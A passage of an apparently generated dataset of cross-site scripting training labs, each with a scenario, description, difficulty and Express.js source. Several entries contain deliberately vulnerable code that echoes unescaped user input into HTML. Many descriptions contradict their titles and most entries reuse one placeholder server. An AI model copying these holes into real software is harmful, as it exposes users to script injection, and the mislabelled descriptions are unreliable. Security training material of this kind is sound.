    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in file preview feature.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in invoice generation",
    "Lab Description": "The invoice generation page displays user input without sanitization, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/invoice', (req, res) => {\n    const client = req.query.client || 'Anonymous';\n    res.send(`<h1>Invoice for ${client}</h1>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in blog comment section",
    "Lab Description": "Users can comment on blog posts, but their input is stored and displayed without proper escaping, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet comments = [];\n\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.send('Comment added!');\n});\n\napp.get('/comments', (req, res) => {\n    res.send(comments.map(c => `<p>${c}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in notification banner",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in notification banner.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in ticket refund system",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in ticket refund system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in event registration details",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in event registration details.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in interactive dashboard",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in interactive dashboard.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in real-time stock price search",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in real-time stock price search.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in leaderboard messages",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in stored xss in leaderboard messages.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in user feedback preview",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in user feedback preview.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in live chat messages",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in live chat messages.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in account recovery questions",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in account recovery questions.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in QR code generator preview",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in dom xss in qr code generator preview.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in discount code verification",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in discount code verification.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in auction item descriptions",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in auction item descriptions.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in collaborative whiteboard app",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in dom xss in collaborative whiteboard app.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in password strength meter",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in password strength meter.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in customer support tickets",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in customer support tickets.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in interactive maps",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in interactive maps.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in product review page",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in product review page.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in personalized homepage widgets",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in personalized homepage widgets.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in e-commerce product search",
    "Lab Description": "The product search page reflects user input in search results without sanitization, leading to a reflected XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q || 'No results';\n    res.send(`<h1>Search Results</h1><p>Results for: ${query}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user-generated playlists",
    "Lab Description": "Users can create playlists and name them, but input is stored without escaping, leading to stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet playlists = [];\n\napp.post('/create-playlist', (req, res) => {\n    playlists.push(req.body.name);\n    res.send('Playlist created!');\n});\n\napp.get('/playlists', (req, res) => {\n    res.send(playlists.map(p => `<p>${p}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in interactive calendar",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in interactive calendar.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in tax calculation tool",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in reflected xss in tax calculation tool.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in video streaming subtitles",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in dom xss in video streaming subtitles.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in online banking transfer notes",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in online banking transfer notes.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in survey comment responses",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in survey comment responses.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in stock market dashboard",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in stock market dashboard.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in package tracking system",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in reflected xss in package tracking system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in internal HR messages",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in internal hr messages.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in gaming leaderboard display",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in gaming leaderboard display.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in invoice PDF preview",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in reflected xss in invoice pdf preview.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in webinar Q&A section",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in webinar q&a section.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in email subject autofill",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in email subject autofill.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in online hotel booking",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in online hotel booking.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in educational course reviews",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in stored xss in educational course reviews.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in customizable dashboard widgets",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in customizable dashboard widgets.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in appointment scheduling notes",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in reflected xss in appointment scheduling notes.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in health records messaging system",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in health records messaging system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in live weather updates",
    "Lab Description": "The live weather update page reflects user input without sanitization, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/weather', (req, res) => {\n    const location = req.query.location || 'Unknown';\n    res.send(`<h1>Weather for ${location}</h1>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user-generated polls",
    "Lab Description": "Users can create polls with custom options, but input is stored without escaping, leading to stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet polls = [];\n\napp.post('/create-poll', (req, res) => {\n    polls.push(req.body.option);\n    res.send('Poll option added!');\n});\n\napp.get('/polls', (req, res) => {\n    res.send(polls.map(p => `<p>${p}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in real-time chat widget",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in real-time chat widget.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in movie ticket booking",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in movie ticket booking.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in restaurant reviews",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in restaurant reviews.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in cryptocurrency price tracker",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in cryptocurrency price tracker.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in e-learning quiz system",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in e-learning quiz system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in healthcare appointment notes",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in healthcare appointment notes.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in online whiteboard application",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in dom xss in online whiteboard application.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in customer complaint portal",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in customer complaint portal.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in personal finance notes",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in stored xss in personal finance notes.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in IoT dashboard logs",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in iot dashboard logs.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in job application form",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in job application form.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in university online grading system",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in university online grading system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in gaming community chat",
    "Lab Description": "The gaming community chat feature dynamically updates messages using JavaScript. However, user input is directly inserted into the DOM without proper sanitization, making it vulnerable to DOM-based XSS. Attackers can inject malicious scripts into chat messages that execute when another user opens the chat window.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in digital signature preview",
    "Lab Description": "The digital signature preview system displays user-provided text as a signature image. However, it reflects user input without escaping special characters, making it vulnerable to reflected XSS. Attackers can craft a malicious URL that executes JavaScript when victims open the preview link.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online course comments",
    "Lab Description": "The online course platform allows students to comment on lessons, but it fails to sanitize stored input. An attacker can inject a malicious script in a comment, which will execute whenever a student or instructor views the discussion section.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in social media live updates",
    "Lab Description": "The social media platform fetches live updates using JavaScript and directly injects them into the DOM without sanitization. Attackers can exploit this to inject scripts that execute automatically when users scroll through their feed.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in two-factor authentication prompt",
    "Lab Description": "The two-factor authentication (2FA) system displays error messages containing user input when an invalid code is entered. However, the input is not sanitized, allowing an attacker to execute malicious JavaScript by crafting a specially crafted login URL.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in travel itinerary notes",
    "Lab Description": "Users can add notes to their travel itinerary, but the application stores and displays this input without sanitization. An attacker could insert JavaScript into their itinerary notes, which will execute when viewed by the user or shared with others.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in AI chatbot interactions",
    "Lab Description": "The AI chatbot processes and displays user input in real-time without sanitization. Attackers can craft malicious messages that inject scripts into the chat window, leading to DOM-based XSS attacks when the chatbot responds.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in food delivery order summary",
    "Lab Description": "The food delivery service reflects user-provided data in the order summary without sanitization. Attackers can manipulate the order summary page to execute JavaScript by tricking users into opening a malicious order confirmation link.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in virtual conference Q&A section",
    "Lab Description": "The virtual conference platform allows attendees to submit questions during live sessions. However, it does not sanitize stored input, allowing an attacker to submit a JavaScript payload that executes when the speaker or other attendees view the Q&A panel.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in airline booking search",
    "Lab Description": "The airline booking system allows users to search for flights, but it fails to properly sanitize the search query, making it vulnerable to reflected XSS attacks. Attackers can craft a malicious URL to inject a script that executes in the victim's browser.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search-flights', (req, res) => {\n    const query = req.query.q || 'No results';\n    res.send(`<h1>Flight Search Results</h1><p>Results for: ${query}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online banking transaction history",
    "Lab Description": "Users can add transaction descriptions in their online banking history. The system does not properly escape user input, allowing an attacker to store a malicious JavaScript payload that executes whenever the transaction history is viewed.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet transactions = [];\n\napp.post('/add-transaction', (req, res) => {\n    transactions.push(req.body.description);\n    res.send('Transaction added!');\n});\n\napp.get('/transactions', (req, res) => {\n    res.send(transactions.map(t => `<p>${t}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in e-commerce checkout page",
    "Lab Description": "The checkout page dynamically updates user input fields without sanitization, allowing an attacker to inject malicious scripts that execute when the page loads.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in hotel reservation system",
    "Lab Description": "The hotel booking platform displays user-provided reservation details without escaping special characters, making it susceptible to reflected XSS when a malicious link is clicked.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in medical appointment notes",
    "Lab Description": "Doctors and patients can add notes to appointments, but the system fails to sanitize input, allowing attackers to store scripts that execute when the notes are viewed.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in online document editor",
    "Lab Description": "The web-based document editor processes user input dynamically and inserts it into the DOM without proper escaping, leading to a potential XSS attack when an attacker crafts a malicious payload.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in cryptocurrency wallet transactions",
    "Lab Description": "The wallet application updates transaction history dynamically using JavaScript, failing to escape user input, leading to an XSS vulnerability when processing data from an attacker-controlled source.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in insurance claim submission",
    "Lab Description": "The insurance claim form reflects user input in error messages without escaping special characters, allowing attackers to inject JavaScript into the response.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online food delivery reviews",
    "Lab Description": "Customers can leave reviews for food deliveries, but the platform does not sanitize input, enabling an attacker to store JavaScript that executes when another user reads the review.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in real-time stock market dashboard",
    "Lab Description": "The stock market dashboard updates stock prices dynamically, but fails to sanitize data sources, allowing attackers to manipulate the DOM with malicious scripts.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in digital signature generator",
    "Lab Description": "The signature generator accepts user input for customizing signatures, but improperly reflects input back to users, allowing reflected XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online gaming profiles",
    "Lab Description": "Gamers can update their profile bios, but the system does not sanitize input, enabling attackers to inject JavaScript that executes when other players view the profile.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in online course video player",
    "Lab Description": "The online learning platform loads video descriptions dynamically without escaping user-generated content, making it vulnerable to DOM-based XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in online event registration",
